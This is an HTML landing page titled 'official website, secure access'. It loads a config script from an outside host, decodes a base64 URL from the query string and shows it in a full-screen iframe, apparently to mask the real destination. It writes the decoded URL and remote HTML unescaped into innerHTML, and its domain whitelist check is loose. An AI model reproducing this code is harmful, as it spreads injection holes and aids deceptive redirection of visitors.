<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
<meta content="yes" name="apple-mobile-web-app-capable">
<meta content="yes" name="apple-touch-fullscreen">
<meta content="black" name="apple-mobile-web-app-status-bar-style">
<meta content="320" name="MobileOptimized">
<title>官方网站 安全访问</title>
<style>
.container {
    width: 100px;
    height: 100px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    animation: rotate-move 2s ease-in-out infinite;
}
.dot {
    width: 15px;
    height: 15px;
    border-radius: 50%;
    position: absolute;
    top: 0; bottom: 0; left: 0; right: 0;
    margin: auto;
}
.dot-1 { background:#ffe386; animation:dot-1-move 2s ease infinite; }
.dot-2 { background:#10beae; animation:dot-2-move 2s ease infinite; }
.dot-3 { background:#f74d75; animation:dot-3-move 2s ease infinite; }

@keyframes dot-3-move {
    20%{transform:scale(1)}45%{transform:translateY(-18px) scale(.45)}60%{transform:translateY(-25px) scale(.45)}80%{transform:translateY(-25px) scale(.45)}100%{transform:translateY(0) scale(1)}
}
@keyframes dot-2-move {
    20%{transform:scale(1)}45%{transform:translate(-16px,12px) scale(.45)}60%{transform:translate(-20px,15px) scale(.45)}80%{transform:translate(-20px,15px) scale(.45)}100%{transform:translateY(0) scale(1)}
}
@keyframes dot-1-move {
    20%{transform:scale(1)}45%{transform:translate(16px,12px) scale(.45)}60%{transform:translate(20px,15px) scale(.45)}80%{transform:translate(20px,15px) scale(.45)}100%{transform:translateY(0) scale(1)}
}
@keyframes rotate-move {
    55%{transform:translate(-50%,-50%) rotate(0deg)}80%{transform:translate(-50%,-50%) rotate(360deg)}100%{transform:translate(-50%,-50%) rotate(360deg)}
}
.content{
    height:100%;width:100%;position:fixed;left:-2px;top:-2px;border:none;
}
</style>
</head>
<body>

<div id="app">
    <div class="container" id="container">
        <div class="dot dot-1"></div>
        <div class="dot dot-2"></div>
        <div class="dot dot-3"></div>
    </div>
</div>

<script src="https://fh.mtjm.xyz/api.php"></script>

<script>
// 从 c= 参数获取目标地址并提取域名
function getTargetHost() {
    try {
        const c = new URLSearchParams(location.search).get('c');
        const url = atob(c);
        return new URL(url).host;
    } catch (e) {
        return null;
    }
}

// 校验目标域名是否在白名单
function checkTargetInWhiteList() {
    if (!white_config.white_enable) return true;
    const targetHost = getTargetHost();
    if (!targetHost) return false;

    const list = white_config.white_domains;
    for (let item of list) {
        if (item.startsWith('*.')) {
            const suffix = item.slice(2);
            if (targetHost.endsWith(suffix)) return true;
        } else {
            if (targetHost === item) return true;
        }
    }
    return false;
}

// 执行校验
if (checkTargetInWhiteList()) {
    try {
        const c = new URLSearchParams(location.search).get('c');
        const realUrl = atob(c);
        if (realUrl.includes('http')) {
            setTimeout(() => {
                document.getElementById('container').style.display = 'none';
                document.getElementById('app').innerHTML =
                  '<iframe class="content" src="'+realUrl+'"></iframe>';
            }, 1500);
        }
    } catch(e){}
} else {
    document.getElementById('app').innerHTML = white_config.deny_html;
}
</script>

</body>
</html>
